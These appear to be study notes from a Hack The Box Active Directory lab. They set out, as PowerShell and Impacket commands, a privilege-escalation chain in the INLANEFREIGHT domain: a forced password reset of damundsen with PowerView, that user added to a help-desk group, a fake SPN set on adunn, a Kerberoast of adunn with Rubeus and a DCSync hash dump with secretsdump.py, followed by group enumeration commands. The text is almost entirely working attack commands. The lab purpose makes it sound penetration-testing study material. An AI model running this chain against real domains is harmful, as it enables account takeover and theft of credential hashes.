# Scenario 1
1. Use the wley user to change the password for the damundsen user
2. Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group
3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user

# Force change the password of the user damundsen
- Creating a PSCredential Object
```
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```
- Creating a SecureString Object
```
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
- Changing the User's Password
```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
- Creating a SecureString Object using damundsen
```
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```
- Adding damundsen to the Help Desk Level 1 Group
```
PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```
- Confirming damundsen was Added to the Group
```
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
- Creating a Fake SPN
```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
- Kerberoasting with Rubeus
```
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
```
- DCSync
```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```
- To specify an user, use option -just-dc-user
```
secretsdump.py -outputfile inlanefreight_hashes -just-dc-user adunn INLANEFREIGHT/adunn@172.16.5.5 
```
# 

## List user in a group domain
```
Get-DomainGroupMember "Domain Admins" | select @{N="MemberName";E={[System.Text.Encoding]::ASCII.GetString($_.MemberName)}}
```

## List localgroup on a computer
`Get-NetLocalGroup -ComputerName ACADEMY-EA-MS01 | select GroupName`